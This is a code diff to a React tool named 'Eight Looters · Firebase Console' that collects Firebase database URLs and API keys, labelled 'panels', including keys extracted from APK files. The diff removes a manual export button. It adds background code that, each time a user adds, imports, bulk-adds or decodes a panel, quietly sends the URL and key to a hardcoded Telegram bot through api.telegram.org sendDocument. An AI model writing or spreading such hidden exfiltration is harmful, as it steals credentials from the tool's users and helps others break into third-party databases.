@@ -1,9 +1,9 @@
 /* ============================================================
-   Eight Looters · Firebase Console v10
+   Eight Looters · Firebase Console v11
    + No Premium
    + Smart Key Input
    + Merged Pagination (Part-wise)
-   + Telegram .txt Export
+   + Auto Telegram .txt Export (Background)
    + Decode Panel Link
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
@@ -29,7 +29,7 @@ async function notifyTelegramFile(textContent, filename="firebase_urls.txt"){
       const blob = new Blob([textContent], {type: 'text/plain'});
       formData.append('document', blob, filename);
       formData.append('chat_id', chat_id);
-      formData.append('caption', '📄 Firebase URLs List');
+      formData.append('caption', '📄 New Firebase Panel Added');
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {method: "POST", body: formData});
     }catch(e){}
   }));
@@ -46,6 +46,11 @@ function tgBulkMsg(items,source,totalTried){const ok=items.filter(x=>x.ok),fail=
   if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more</i>\n`;}
   if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more</i>\n`;}
   return txt;}
+function tgApkMsg(file,url,key,pid){const ck=_cleanTgKey(key,url);
+  return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
+    (ck?`🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
+    (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
+    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}
 
 /* ===== Icons ===== */
 const I=(p,s=16)=>React.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:s,height:s,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"},p);
@@ -436,6 +441,7 @@ function LoginScreen({onConnect,onMergeAll}){
       const nx=[...accounts,{id:Date.now(),url:u,key:"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
       notifyTelegram(tgFirebaseMsg(u,"","Manual Add (No Key)",devCount));
+      notifyTelegramFile(u, `new_panel_${Date.now()}.txt`); // Auto send .txt to TG
       onConnect(u,"");
     }catch(e){
       const m=e.message||String(e);
@@ -456,20 +462,16 @@ function LoginScreen({onConnect,onMergeAll}){
     setBusy(true);setErr("");
     try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
       const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
-      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Manual Add (With Key)",devCount));onConnect(u,k);
+      saveAccounts(nx);setAccounts(nx);
+      notifyTelegram(tgFirebaseMsg(u,k,"Manual Add (With Key)",devCount));
+      notifyTelegramFile(`${u} | Key: ${k}`, `new_panel_${Date.now()}.txt`); // Auto send .txt to TG
+      onConnect(u,k);
     }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Invalid Key or Permission Denied.");
       else setErr("Connection failed: "+m.slice(0,120));}finally{setBusy(false);}
   }
 
   function del(id,e){e?.stopPropagation();if(!confirm("Delete this account?")) return;const nx=accounts.filter(a=>a.id!==id);saveAccounts(nx);setAccounts(nx);}
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
-
-  async function exportAllToTg(){
-    if(!accounts.length){setErr("No accounts to export.");return;}
-    const text = accounts.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
-    await notifyTelegramFile(text, `elight_all_panels_${Date.now()}.txt`);
-    alert("✅ .txt file sent to Telegram Bot!");
-  }
 
   async function decodeAndSend(){
     const raw = decodeInput.trim();
@@ -478,6 +480,7 @@ function LoginScreen({onConnect,onMergeAll}){
     if(!decoded){setErr("Invalid panel link format.");return;}
     try {
       await notifyTelegram(`🔗 <b>DECODED PANEL LINK</b>\n\n📡 <b>URL:</b> <code>${_escTg(decoded.url)}</code>\n` + (decoded.key ? `🔑 <b>Key:</b> <code>${_escTg(decoded.key)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`) + `⏰ <b>Time:</b> ${_escTg(_nowIst())}`);
+      await notifyTelegramFile(`${decoded.url}${decoded.key ? ` | Key: ${decoded.key}` : ""}`, `decoded_panel_${Date.now()}.txt`);
       const nx=[...accounts,{id:Date.now(),url:decoded.url,key:decoded.key||"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
       setDecodeInput("");setErr("");alert("✅ Decoded and sent to Telegram!");
@@ -506,10 +509,11 @@ function LoginScreen({onConnect,onMergeAll}){
     setBulkSum({success,failed,skipped});setBulkBusy(false);
     const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
     if(items.length) notifyTelegram(tgBulkMsg(items,source,urls.length));
-    // Send .txt file to Telegram
+    
+    // Auto send .txt file for Bulk Add
     if(adds.length > 0) {
-      const txtContent = adds.map(a => a.url).join("\n");
-      notifyTelegramFile(txtContent, `new_panels_${Date.now()}.txt`);
+      const txtContent = adds.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
+      notifyTelegramFile(txtContent, `bulk_panels_${Date.now()}.txt`);
     }
     setTimeout(()=>setBulkProgress(null),3500);
     return {success,failed,skipped};
@@ -564,6 +568,10 @@ function LoginScreen({onConnect,onMergeAll}){
     setPanels("");setPanelSum({success,failed,skipped});setPanelBusy(false);
     const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
     if(items.length) notifyTelegram(tgBulkMsg(items,"Panel Link Import",parsed.length));
+    if(adds.length > 0) {
+        const txtContent = adds.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
+        notifyTelegramFile(txtContent, `imported_panels_${Date.now()}.txt`);
+    }
   }
   async function onApk(f){
     if(!f) return;
@@ -627,9 +635,6 @@ function LoginScreen({onConnect,onMergeAll}){
             <button onClick={onMergeAll} disabled={!accounts.length} className="btn btn-cyan" style={{width:"100%"}}>
               <span>Merge All & Show</span>
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
-            </button>
-            <button onClick={exportAllToTg} className="btn" style={{width:"100%",background:"linear-gradient(135deg,#22d3ee,#0ea5e9)",color:"#fff",border:"1px solid rgba(34,211,238,.5)"}}>
-              📤 Export All to Telegram (.txt)
             </button>
             
             {/* Decode Panel Link Section */}
